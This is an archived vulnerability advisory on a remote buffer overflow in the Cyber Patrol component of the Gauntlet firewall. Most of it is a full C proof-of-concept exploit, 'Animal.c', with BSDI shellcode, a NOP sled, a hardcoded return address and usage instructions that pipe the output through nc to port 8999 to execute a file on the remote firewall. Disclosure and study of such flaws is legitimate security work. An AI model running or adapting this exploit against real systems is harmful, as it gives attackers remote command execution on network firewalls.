source: http://www.securityfocus.com/bid/1234/info

A buffer overflow exists in the version of Mattel's Cyber Patrol software integrated in to Network Associates Gauntlet firewall, versions 4.1, 4.2, 5.0 and 5.5. Due to the manner in which Cyber Patrol was integrated, a vulnerability was introduced which could allow a remote attacker to gain root access on the firewall, or execute arbitrary commands on the firewall.

By default, Cyber Patrol is installed on Gauntlet installations, and runs for 30 days. After that period, it is disabled. During this 30 day period, the firewall is susceptible to attack,. Due to the filtering software being externally accessible, users not on the internal network may also be able to exploit the vulnerability.

Some versions of SGI IRIX shipped with the Gauntlet Firewall package, and in the past it was a supported SGI product. While it is no longer being supported, SGI IRIX versions 6.5.2, 6.5.3, 6.5.4 and 6.5.5 may be prone to this issue. 

/*
*                  Animal.c
*
*
* Remote Gauntlet BSDI proof of concept exploit.
* Garrison technologies may have found it, but I am the
* one who released it.  ;) I do not have a Sparc or I would
* write up the Solaris one too.  If you have one, please
* make the changes needed and post it.  Thanks.
*
* Script kiddies can go away, this will only execute a file
* named /bin/zz on the remote firewall.  To test this code,
* make a file named /bin/zz and chmod it to 700.
* I suggest for the test you just have the zz file make a note
* in syslog or whatever makes you happy.
*
* This code is intened for proof of concept only.
*
*
* _Gramble_
*                                             Hey BuBBles
*
*To use:
*      # Animal | nc <address> 8999
*/


#include <stdio.h>


char data[364];

main() {
        int i;
	char shelloutput[80];


/* just borrowed this execute code from another exploit */

	unsigned char shell[] =
        "\x90"
	"\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c\x89\x76"
	"\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff\xff\xff\xff\x07"
	"\xff\xe8\xdc\xff\xff\xff/bin/zz\x00";


        for(i=0;i<264;i++)
                data[i]=0x90;
		data[i]=0x30;i++;
		data[i]=0x9b;i++;
		data[i]=0xbf;i++;
		data[i]=0xef;i++;
		data[i] = 0x00;
	for (i=0; i<strlen(shell); i++)
		shelloutput[i] = shell[i];
		shelloutput[i] = 0x00;

	printf("10003.http://%s%s", data, shelloutput);


}